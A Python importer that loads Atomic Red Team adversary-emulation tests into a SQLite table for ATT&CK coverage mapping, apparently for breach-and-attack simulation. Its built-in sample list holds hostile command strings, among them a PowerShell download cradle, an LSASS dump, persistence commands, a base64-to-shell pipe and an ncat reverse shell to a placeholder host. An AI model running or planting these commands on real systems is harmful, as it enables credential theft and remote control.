"""
import_atomics.py — Import Atomic Red Team tests (mapped to MITRE ATT&CK) into
XTHREAT.ATOMICTEST.  Jerome Athias - XORCISM

Atomic Red Team (redcanaryco/atomic-red-team) is the open library of atomic adversary-
emulation tests, each mapped to an ATT&CK technique. Importing it gives XORCISM the
out-of-the-box BAS test library (like AttackIQ / SafeBreach / Caldera) that powers the
ATT&CK validation-coverage heatmap (/attack).

Target: XTHREAT.db, table ATOMICTEST (created if missing). Idempotent by the test's
auto_generated_guid (AtomicGUID). AttackTechniqueID is resolved from ATTACKTECHNIQUE.

Usage:
    python import_atomics.py --sample            # seed a built-in demo set (no dependency)
    python import_atomics.py --file index.yaml   # local Atomic Red Team index (needs PyYAML)
    python import_atomics.py                      # download the ART index (needs PyYAML + requests)

PyYAML is required ONLY for --file / download (pip install pyyaml). --sample needs nothing.
"""
import argparse
import os
import sqlite3
import sys
from datetime import datetime, timezone
from uuid import uuid5, NAMESPACE_URL

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
from xorcism_python import config  # noqa: E402

DB_PATH = os.path.join(config.DB_DIR, "XTHREAT.db")
ART_INDEX_URL = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/Indexes/index.yaml"
SOURCE = "atomic-red-team"


def now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


def log(msg: str) -> None:
    print(f"[ImportAtomics] {msg}", flush=True)


# Built-in demo set (no dependency) — realistic enterprise ATT&CK techniques so the
# coverage heatmap lights up. GUIDs are deterministic (uuid5 of name) for idempotency.
def _g(name: str) -> str:
    return str(uuid5(NAMESPACE_URL, "xorcism-atomic:" + name))


SAMPLE = [
    ("T1059.001", "PowerShell download cradle", "windows", "powershell",
     "IEX (New-Object Net.WebClient).DownloadString('http://example/p.ps1')"),
    ("T1059.003", "Windows cmd execution", "windows", "command_prompt", "cmd /c whoami"),
    ("T1003.001", "Dump LSASS via comsvcs", "windows", "powershell",
     "rundll32 comsvcs.dll MiniDump <pid> lsass.dmp full"),
    ("T1547.001", "Run key persistence", "windows", "command_prompt",
     "reg add HKCU\\...\\Run /v X /d payload.exe"),
    ("T1053.005", "Scheduled task creation", "windows", "command_prompt",
     "schtasks /create /tn X /tr payload.exe /sc onlogon"),
    ("T1082", "System information discovery", "windows", "command_prompt", "systeminfo"),
    ("T1016", "Network configuration discovery", "windows", "command_prompt", "ipconfig /all"),
    ("T1136.001", "Create local account", "windows", "command_prompt", "net user xor P@ss /add"),
    ("T1070.004", "File deletion", "windows", "command_prompt", "del /f /q payload.exe"),
    ("T1105", "Ingress tool transfer (curl)", "linux", "sh", "curl -fsSL http://example/t -o /tmp/t"),
    ("T1027", "Base64-encoded payload", "linux", "sh", "echo cGF5bG9hZA== | base64 -d | sh"),
    ("T1571", "Non-standard port C2", "linux", "sh", "ncat example 4444 -e /bin/sh"),
]


def ensure_table(cur) -> None:
    cur.execute(
        """CREATE TABLE IF NOT EXISTS ATOMICTEST (
             AtomicTestID INTEGER PRIMARY KEY, AtomicGUID TEXT UNIQUE, Name TEXT, Description TEXT,
             AttackID TEXT, AttackTechniqueID INTEGER, Platform TEXT, Executor TEXT,
             Command TEXT, Cleanup TEXT, Source TEXT, ExternalReferences TEXT, CreatedDate DATE)"""
    )
    cur.execute("CREATE INDEX IF NOT EXISTS ix_atomic_attack ON ATOMICTEST(AttackID)")


def _tech_id(cur, attack_id: str, has_attack: bool):
    if not has_attack:
        return None
    r = cur.execute("SELECT AttackTechniqueID FROM ATTACKTECHNIQUE WHERE AttackID=? LIMIT 1", (attack_id,)).fetchone()
    return r[0] if r else None


def upsert(cur, has_attack: bool, guid, name, desc, attack_id, platform, executor, command, cleanup) -> int:
    techid = _tech_id(cur, attack_id, has_attack)
    cur.execute(
        """INSERT INTO ATOMICTEST
             (AtomicGUID, Name, Description, AttackID, AttackTechniqueID, Platform, Executor, Command, Cleanup, Source, CreatedDate)
           VALUES (?,?,?,?,?,?,?,?,?,?,?)
           ON CONFLICT(AtomicGUID) DO UPDATE SET Name=excluded.Name, Description=excluded.Description,
             AttackID=excluded.AttackID, AttackTechniqueID=excluded.AttackTechniqueID, Platform=excluded.Platform,
             Executor=excluded.Executor, Command=excluded.Command, Cleanup=excluded.Cleanup""",
        (guid, name, desc, attack_id, techid, platform, executor, command, cleanup, SOURCE, now()),
    )
    return 1 if cur.rowcount else 0


def iter_index(data):
    """Yield atomic-test tuples from an Atomic Red Team index (YAML → dict)."""
    for _tactic, techs in (data or {}).items():
        if not isinstance(techs, dict):
            continue
        for tid, entry in techs.items():
            if not isinstance(entry, dict):
                continue
            for at in entry.get("atomic_tests", []) or []:
                if not isinstance(at, dict):
                    continue
                ex = at.get("executor") or {}
                plats = at.get("supported_platforms") or []
                yield (
                    at.get("auto_generated_guid") or _g(str(tid) + ":" + str(at.get("name"))),
                    str(at.get("name") or "")[:255],
                    str(at.get("description") or "")[:4000],
                    str(tid),
                    ", ".join(plats) if isinstance(plats, list) else str(plats),
                    str(ex.get("name") or ""),
                    str(ex.get("command") or "")[:4000],
                    str(ex.get("cleanup_command") or "")[:4000],
                )


def main() -> None:
    ap = argparse.ArgumentParser(description="Import Atomic Red Team tests into XTHREAT.ATOMICTEST")
    ap.add_argument("--sample", action="store_true", help="Seed a built-in demo set (no dependency)")
    ap.add_argument("--file", help="Local Atomic Red Team index.yaml (needs PyYAML)")
    args = ap.parse_args()

    rows = []
    if args.sample:
        rows = [(_g(name), name, "Atomic Red Team demo test", aid, plat, ex, cmd, "") for (aid, name, plat, ex, cmd) in SAMPLE]
    else:
        try:
            import yaml  # type: ignore
        except ImportError:
            raise SystemExit("PyYAML required for the real import (pip install pyyaml). Use --sample for a demo set.")
        if args.file:
            log(f"Reading {args.file}")
            with open(args.file, "r", encoding="utf-8") as f:
                data = yaml.safe_load(f)
        else:
            import requests
            log(f"Downloading {ART_INDEX_URL}")
            r = requests.get(ART_INDEX_URL, timeout=120, headers={"User-Agent": "XORCISM-atomics-importer"})
            r.raise_for_status()
            data = yaml.safe_load(r.text)
        rows = list(iter_index(data))

    log(f"{len(rows)} atomic tests to import")
    if not rows:
        return
    conn = sqlite3.connect(DB_PATH)
    conn.execute("PRAGMA busy_timeout = 5000")
    cur = conn.cursor()
    ensure_table(cur)
    has_attack = cur.execute("SELECT 1 FROM sqlite_master WHERE type='table' AND name='ATTACKTECHNIQUE'").fetchone() is not None
    new = sum(upsert(cur, has_attack, *row) for row in rows)
    conn.commit()
    total = cur.execute("SELECT COUNT(*) FROM ATOMICTEST").fetchone()[0]
    resolved = cur.execute("SELECT COUNT(*) FROM ATOMICTEST WHERE AttackTechniqueID IS NOT NULL").fetchone()[0]
    conn.close()
    log(f"Done ({now()}) — {new} new/updated, {total} atomic tests total ({resolved} linked to an ATT&CK technique).")


if __name__ == "__main__":
    main()
